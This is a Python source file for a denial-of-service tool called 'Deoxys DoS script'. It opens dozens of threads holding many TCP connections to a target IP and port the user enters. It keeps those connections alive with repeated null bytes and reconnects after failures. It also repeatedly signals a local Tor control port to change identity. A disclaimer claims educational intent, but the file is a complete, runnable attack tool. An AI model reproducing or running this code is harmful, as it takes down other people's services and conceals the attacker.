#----------------------------------------------
# create by m9rl0n 
# Deoxys DoS script
# versión 2.5
#----------------------------------------------

#----------------------------------------------
# DISCLAIME
# This script was made for educational purposes 
# I do not approve use for malicious purposes 
#----------------------------------------------

import socket
import threading
import time

# ANSI escape codes for colors
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'  # To reset the color to default

# Function to establish connections and perform the attack
def attack(target_host, target_port, thread_id):
    sockets = []
    for _ in range(CONNECTIONS):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, target_port))
            sockets.append(sock)
        except Exception as e:
            print(f"{RED}Thread {thread_id}: Connection failed: {e}{RESET}")
    
    while True:
        for sock in sockets:
            try:
                sock.send(b"\0")  # Sends a byte to the target server
                print(f"{GREEN}Thread {thread_id}: Voly Sent{RESET}")
            except Exception as e:
                print(f"{RED}Thread {thread_id}: Send failed: {e}{RESET}")
                sock.close()
                sockets.remove(sock)
                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    new_sock.connect((target_host, target_port))
                    sockets.append(new_sock)
                except Exception as e:
                    print(f"{RED}Thread {thread_id}: Reconnect failed: {e}{RESET}")
        
        time.sleep(0.3)  # Wait before repeating the cycle

# Function to change identity (simulating Tor)
def cycle_identity():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("localhost", 9050))
            sock.send(b"AUTHENTICATE \"\"\n")
            sock.send(b"signal NEWNYM\n\x00")
            print(f"{GREEN}Cycle identity -> signal NEWNYM{RESET}")
            sock.close()
        except Exception as e:
            print(f"{RED}Cycle identity failed: {e}{RESET}")
        
        time.sleep(0.3)  # Wait before repeating the cycle

if __name__ == "__main__":
    CONNECTIONS = 8
    THREADS = 48

    # Prompt the user to enter the target IP address and port
    target_host = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))

    # Launch threads for the DDoS attack
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack, args=(target_host, target_port, i))
        threads.append(t)
        t.start()
        time.sleep(0.2)  # Wait between starting each thread

    # Launch a thread for the identity cycle (simulating Tor)
    identity_thread = threading.Thread(target=cycle_identity)
    identity_thread.start()

    # Keep the program running until Enter is pressed
    input("Press Enter to stop the DDoS attack...\n")

    # Stop all threads when Enter is pressed
    for t in threads:
        t.join()

    identity_thread.join()
